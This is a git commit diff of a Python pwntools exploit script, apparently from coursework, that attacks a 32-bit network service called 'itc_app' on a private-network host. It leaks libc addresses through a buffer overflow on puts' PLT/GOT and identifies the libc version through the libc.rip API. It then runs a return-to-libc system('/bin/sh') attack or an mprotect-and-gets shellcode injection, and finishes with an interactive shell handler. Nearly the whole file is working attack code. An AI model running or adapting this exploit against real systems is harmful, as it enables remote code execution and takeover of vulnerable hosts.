b783fdda2e44aa0587b81b56d47a3ff76785720a
Ka1al0gen <kaialogen@protonmail.com>
2024-03-21 18:57:21 +0000

    Update remote_main_prototype.py

--- remote_main_prototype.py
+++ remote_main_prototype.py
@@ -1,72 +1,367 @@
-from pwn import *
-import json
 import requests
+import json
+from pwn import *
 
-# Target configuration
-remote_ip = '192.168.1.138'
-remote_port = 9000
+remoteIp = '192.168.0.155'
+remotePort = 9000
+conn = remoteIp
+port = remotePort
 
-# Static configuration based on binary analysis
-buffer_size = 132
-plt_puts = 0x8048340
-plt_gets = 0x08048330
-main_address = 0x804847b
-got_puts = 0x80497ac
-got_gets = 0x80497a8
+outputLines_b = 6
+outputLines_a = 2
+arch = 4
 
-# Offsets for the version of libc used by the target (example values, adjust for your target)
-puts_offset = 0xb75f9cb0
-system_offset = 0x3adb0
-exit_offset = 0x2e9e0
-bin_sh_offset = 0x15bb2b
-
-# Example shellcode: execve("/bin/sh", NULL, NULL)
+leakNo = 30
+leakDelim = b"Welcome"
+useShellcode = True
+writeToStack = False
+# 21 bytes execve('/bin/sh') shellcode from https://shell-storm.org/shellcode/files/shellcode-841.html (Bem, 2013)
 shellcode = b"\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80"
 
-def leak_address(target_ip, target_port, got_address):
-    conn = remote(target_ip, target_port)
+static = "./itc_app"
+
+headers1 = {'Content-Type': 'application/json'}
+headers2 = headers1
+# (Baumstark, 2020)
+findLibcUrl = 'https://libc.rip/api/find'
+libcSearchUrl = "https://libc.rip/api/libc/"
+redirectStdErr = True
+
+buffSize = 132
+
+# Function offsets (these don't change due to PIE being disabled)
+pltPuts = 0x8048340
+pltGets = 0x08048330
+mainAddr = 0x804847b
+gotPuts = 0x80497ac
+gotGets = 0x80497a8
+
+# Check if reverse shell was spawned then handle user input and output for the process
+def handleReverseShell():
+    # Check if shell was sucessfully executed
+    noEOF = True
+    try:
+        proc.sendline(b"whoami"+b" 2>&1")
+        print(proc.recv(timeout = 0.1).decode('utf-8'))
+    except EOFError:
+        noEOF = False
+
+    # Create terminal input with option to automatically redirect stderr to stdout
+    commandModifier = b""
+    if redirectStdErr:
+        commandModifier = b" 2>&1"
+    while noEOF:
+        command = input("$ ")
+        try:
+            proc.sendline((command).encode('utf-8')+commandModifier)
+            print(proc.recv(timeout = 0.2).decode('utf-8'))
+        except EOFError:
+            return 200
+    # If EOF found return 300
+    return 300
+
+# Leak randomised libc address via puts' PLT and function's GOT
+def leakViaPuts(conn, port,putOutAddr, msg="puts"):
+    global proc
+
+    # Open process, assuming conn is an IP if port specified
+    if port!=-1:
+        proc = remote(conn,port)
+    else:
+        proc = process(conn)
+
+    # Create different payloads if 64bit specified
+    ## 64 bit doesn't work as it requires knowing the location of a pop rdi; ret rop gadget in the binary and prepending it
+    if arch == 8:
+        pltPutsBytes = p64(pltPuts)
+        mainAddrBytes = p64(mainAddr)
+        putOutAddrBytes = p64(putOutAddr)
+
+    else:
+        pltPutsBytes = p32(pltPuts)
+        mainAddrBytes = p32(mainAddr)
+        putOutAddrBytes = p32(putOutAddr)
     
-    # Create payload to leak address via puts
-    payload = flat([
-        b"A" * buffer_size,
-        p32(plt_puts),
-        p32(main_address),
-        p32(got_address),
-    ], word_size=32)
+    # Create and send puts(*pltOutAddr) buffer overflow payload
+    payload = flat(
+        b'A' * buffSize, # Padding so the next bytes will overwrite the EIP
+        pltPutsBytes,    # Overflowed function will execute puts PLT on return
+        mainAddrBytes,   # pltPuts will execute main() on return to facilitate subsequent buffer overflows
+        putOutAddrBytes  # The first argument to puts PLT
+                         # Which is the GOT address provided which points to the randomised libc address of the function
+    )
+    
+    proc.sendline(payload)
 
-    conn.sendline(payload)
+    # Skip 'outputLines_b' number of lines so the next read will be the leaked value
+    for i in range(outputLines_b):
+        try:
+            proc.recvline()
+        except EOFError:
+            pass
+    
+    # Get the leaked address
+    putsAddr = u32(proc.recv(4))
 
-    # Skip lines to read the leaked address
-    conn.recvlines(6)  # Adjust based on how many lines are before the leak
-    leaked_address = u32(conn.recvn(4))
-    conn.close()
+    # Skip 'outputLines_a' number of lines to make a cleaner output should the program need to read any more lines after
+    for i in range(outputLines_a):
+        try:
+            proc.recvline()
+        except EOFError:
+            pass
+    log.success("Leaked address of "+msg+": "+hex(putsAddr))
+    return putsAddr
 
-    return leaked_address
+# WSL Ubuntu libc6_2.35-0ubuntu3.6_i386 offsets
+#  putsOffset = 0x732a0
+#  systemOffset = 0x48170
+#  exitOffset = 0x3a460
+#  binShOffset = 0x1bd0d5
 
-def exploit(target_ip, target_port):
-    # Leak the address of puts from the GOT to calculate libc base
-    puts_leaked = leak_address(target_ip, target_port, got_puts)
-    libc_base = puts_leaked - puts_offset
+# AppSRV libc6_2.23-0ubuntu11.3_i386 offsets
+#  putsOffset = 0x5fcb0
+#  systemOffset = 0x3adb0
+#  exitOffset = 0x3adb0
+#  binShOffset = 0x15bb2b
 
-    # Calculate the addresses of system, exit, and "/bin/sh" within libc
-    system_addr = libc_base + system_offset
-    exit_addr = libc_base + exit_offset
-    bin_sh_addr = libc_base + bin_sh_offset
+# Perform a return-to-libc attack executing system('/bin/sh')
+def attemptR2Libc(putsOffset, systemOffset, exitOffset, binShOffset):
+    # Leak randomised libc puts addr
+    putsAddr = leakViaPuts(conn, port, gotPuts)
 
-    # Prepare the payload to spawn a shell using the system function
-    payload = flat([
-        b"B" * buffer_size,  # Adjust this size to match the overflow point
-        p32(system_addr),
-        p32(exit_addr),
-        p32(bin_sh_addr),
-    ], word_size=32)
+    # Get lib base addr using putsOffset
+    libc_address = putsAddr - putsOffset
+    log.success(f'LIBC base: {hex(libc_address)}')
 
-    # Send the payload
-    conn = remote(target_ip, target_port)
-    conn.sendline(payload)
+    # Create different payloads if 64bit specified
+    ## 64 bit doesn't work as it requires knowing the location of a pop rdi; ret rop gadget in the binary or libc and prepending it
+    if arch == 8:
+        systemBytes = p64(systemOffset+libc_address)
+        exitBytes = p64(exitOffset+libc_address)
+        binShBytes = p64(binShOffset+libc_address)
+    else:
+        systemBytes = p32(systemOffset+libc_address)
+        exitBytes = p32(exitOffset+libc_address)
+        binShBytes = p32(binShOffset+libc_address)
+    
+    # Create and send system('/bin/sh') buffer overflow payload
+    payload = flat(
+        b'B' * buffSize, # Padding so the next bytes will overwrite the EIP
+        systemBytes,     # Overflowed function will execute system() on return
+        exitBytes,       # system will execute libc's exit() on return
+        binShBytes,      # system's first pararmter 
+                         # Which is libc's '/bin/sh' offset making the function call system('/bin/sh')
+    )
+    proc.sendline(payload)
+    log.success("Executed system('/bin/sh') overflow")
 
-    # Hand over control to the user
-    conn.interactive()
+    # Ouput next lines so next recv will be the ouput of system('/bin/sh')
+    for i in range(outputLines_a):
+        print(proc.recv(timeout = 0.05))
+    
+    # Check if reverse shell was spawned then handle user input and output for the process
+    return handleReverseShell()
 
-if __name__ == "__main__":
-    exploit(remote_ip, remote_port)
+
+# Perform a return-to-libc attack executing system('/bin/sh')
+def attemptR2Libc_shellcode(putsOffset, mprotectOff, printfOff, percpOff):
+    # Leak randomised libc puts addr
+    putsAddr = leakViaPuts(conn, port, gotPuts)
+
+    # Get lib base addr using putsOffset
+    libc_address = putsAddr - putsOffset
+    log.success(f'LIBC base: {hex(libc_address)}')
+    
+    # If the user selects to write the shellcode to the stack then leak stack locations via creating a format string vulnerability
+    if writeToStack:
+
+        # Create different payloads if 64bit specified
+        ## 64 bit doesn't work as it requires knowing the location of a pop rdi; ret rop gadget in the binary or libc and prepending it
+        if arch == 8:
+            printfBytes = p64(printfOff+libc_address)
+            percPBytes = p64(percpOff+libc_address)
+        else:
+            printfBytes = p32(printfOff+libc_address)
+            percPBytes = p32(percpOff+libc_address)
+        
+        # Create and send printf('%x') buffer overflow payload
+        payload = flat(
+            b'B' * buffSize, # Padding so the next bytes will overwrite the EIP
+            printfBytes,     # Overflowed function will execute printf() on return
+            mainAddr,        # printf will execute main() on return to facilitate subsequent buffer overflows
+            percPBytes,      # printf's first pararmter 
+                             # Which is libc's '%x' offset making the function call printf('%x') 
+                             # Which is a format string vulnerability leaking the next value on the stack in hex
+        )
+        log.info("Leaking stack via printf(%x)")
+        # Execute 'leakNo' number of stack leaks and find stack values
+        stackVal = False
+        try:
+            for i in range(leakNo):
+                # Send buffer overflow and leak value
+                proc.sendline(payload)
+                # Skip lines to get leak
+                for i in range(outputLines_b-1):
+                    proc.recvline(timeout = 0.05)
+                
+                # Store leaked value
+                leakLine= proc.recvline(timeout = 0.05)
+                #print(leakLine)
+                leakedVal = leakLine.split(leakDelim)[0]
+
+                # Return error if leaked value doesn't match format
+                if len(leakedVal)==0:
+                    return 100
+                try:
+                    if leakedVal!=b"(nil)":
+                        int(leakedVal,16)
+                except:
+                    return 300
+                
+                ## Find a stack address by checking for an address located in the .text section 
+                ## then the stack address should be the next leaked value
+
+                # Ouput and save stack value if .text address found
+                #print(b"Leaked Value: " + leakedVal)
+                if stackVal:
+                    log.success("Stack Value = "+(leakedVal).decode('utf-8'))
+                    stackAddr = leakedVal
+                    break
+
+                # Check if address in .text (specifically matches the first 4 bytes of the mainAddress)
+                if (leakedVal[:4]).decode("utf-8")==hex(mainAddr)[2:6]:
+                    stackVal = True
+        
+        # Return error if program doesn't leak value
+        except EOFError:
+            return 300
+
+        # Make sure shellcode isn't overwriting important values on the stack
+        codeAddr = int(leakedVal,16)+132+buffSize+len(shellcode)
+    
+    # If the user doesn't want the shellcode on the stack, overwrite the start of libc with the shellcode,
+    # this can be any memory address but the start of libc should be fine
+    else:
+        codeAddr = libc_address
+    
+    # Execute mprotect(&codeaddr, 0x21000, PROT_READ (0x1) | PROT_WRITE (0x2) | PROT_EXEC (0x4)) 
+    # This allows the program to write to and execute the address found above
+    #https://man7.org/linux/man-pages/man2/mprotect.2.html (Free Software Foundation, 2018)
+    payload = flat(
+        b'C' * buffSize,                # Padding so the next bytes will overwrite the EIP
+        p32(mprotectOff+libc_address),  # Overflowed function will execute mprotect() on return
+        mainAddr,                       # mprotect will execute main() on return to facilitate subsequent buffer overflows
+        p32(codeAddr>>0xc<<0xc),        # mprotect's first pararmter, the start address where the memory protections are changed
+                                        # Being the code address gained above with the last 3 bytes set to 0x00
+        p32(0x21000),                   # mprotect's second pararmter, the number of bytes after that address to change protections on
+                                        # With 0x21000 being sufficiently large as to make sure any shellcode can be executed
+        p32(0x7)                        # mprotect's third pararmter, the protection value to change on those addresses
+                                        # Which is Read-Write-Execute: PROT_READ (0x1) | PROT_WRITE (0x2) | PROT_EXEC (0x4) = 0x7
+    )
+    proc.sendline(payload)
+    log.success(f"Changed protections for {hex(codeAddr>>0xc<<0xc)}-{hex((codeAddr>>0xc<<0xc)+0x21000)} to RWX with mprotect")
+
+    # Write shellcode payload to the address found above now changed to be writeable and executable using gets(&codeAddr)
+    # Then execute that shellcode upon return of that gets()
+    payload = flat(
+        b'D' * buffSize, # Padding so the next bytes will overwrite the EIP
+        pltGets,         # Overflowed function will execute gets() on return
+        codeAddr,        # gets will execute shellcode on return. This is the payload execution
+        codeAddr         # The input to gets will be written to the address found above
+    )
+    proc.sendline(payload)
+    log.success(f"Called gets({hex(codeAddr)}) with {hex(codeAddr)} as return addr")
+
+    # Input shellcode to gets so it is written to 'codeAddr' and then executed on return
+    payload = flat(
+        b'\x90'*20,
+        shellcode
+    )
+    proc.sendline(payload)
+    log.success(f"Sent shellcode to {hex(codeAddr)} via gets")
+
+    # Recieve output of previous overflows to clear stdout
+    output = b""
+    while True:
+        try:
+            currline = proc.recv(timeout = 0.2)
+            if len(currline)==0:
+                break
+            output+=currline
+        except:
+            break
+    #print(output)
+    
+    # Check if reverse shell was spawned then handle user input and output for the process
+    return handleReverseShell()
+    
+
+# Get an array of all the potential libc versions that fit the puts and gets offsets provided
+def findPotentialLibcs(putsAddr,getsAddr):
+    data = {"symbols": {"puts": hex(putsAddr),"gets": hex(getsAddr)}}
+    response = requests.post(findLibcUrl, headers=headers1, data=json.dumps(data))
+    responseJson = response.json()
+    log.success(f"Retrieved potential libc versions for puts: {hex(putsAddr)} and gets: {hex(getsAddr)}")
+    return responseJson
+
+# Using the user-specified libc ID get the library's json ouput
+def getSpecificLibc(libId):
+    # Request library using the 'id' key
+    data = {"id":libId}
+    response = requests.post(findLibcUrl, headers=headers1, data=json.dumps(data))
+    responseJson = response.json()
+
+    # Check if library was recieved properly
+    if len(responseJson) == 0:
+        log.failure(f"Failed to retrieve library {libId}")
+    else:
+        log.success(f"Retrieved library {libId}")
+    return responseJson
+
+# Find the offsets of functions and '/bin/sh' from the current libc json
+def getLibcSymbolOffsets(libcJson):
+    # Get the libc id to perform a more thorough search of functions
+    libId = libcJson['id']
+    libcUrl = libcSearchUrl+libId
+    
+    # Define extra symbols to retrieve from the database
+    findSymbols = {"symbols": ["exit", "mprotect", "malloc", "memcpy"]}
+
+    # Request symbols from the datatbase
+    response = requests.post(libcUrl, headers=headers2, data=json.dumps(findSymbols))
+    symbolJson = response.json()
+
+    # Store the symbols into variables
+    putsOff = symbolJson['symbols'].get('puts')
+    systemOff = symbolJson['symbols'].get('system')
+    exitOff = symbolJson['symbols'].get('exit')
+    mprotectOff = symbolJson['symbols'].get('mprotect')
+    printfOff = symbolJson['symbols'].get('printf')
+    bin_shOff = symbolJson['symbols'].get('str_bin_sh')
+    print()
+    log.info("Trying offsets for libc version: "+libId)
+    log.info(f"Offsets - puts: {putsOff}, system: {systemOff}, str_bin_sh: {bin_shOff}, exit: {exitOff}, mprotect: {mprotectOff}, printf: {printfOff}")
+    return putsOff, systemOff, exitOff, bin_shOff, mprotectOff, printfOff
+
+# Find the offset of the string '%x' from the current libc json
+def getPercXOff(libcJson):
+    # Find the url to download the library binary
+    libcUrl = libcJson['download_url']
+    # Get the library binary bytes
+    response = requests.get(libcUrl, headers=headers2)
+    filebytes = response.content
+    # Find and return the offset in the binary of '%x'
+    offset = filebytes.find(b"%x\x00")
+    log.success("%x offset in "+libcJson['id']+": "+hex(offset))
+    return offset
+
+# String to boolean converter is a modified version of: https://stackoverflow.com/a/43357954 (Maxim & dennlinger, 2021)
+def str2bool(v, argname):
+    if isinstance(v, bool):
+        return v
+    if v.lower() in ('yes', 'true', 't', 'y', '1'):
+        return True
+    elif v.lower() in ('no', 'false', 'f', 'n', '0'):
+        return False
+    else:
+        print("\nInvalid boolean value for "+ argname+"\n", file=sys.stderr)
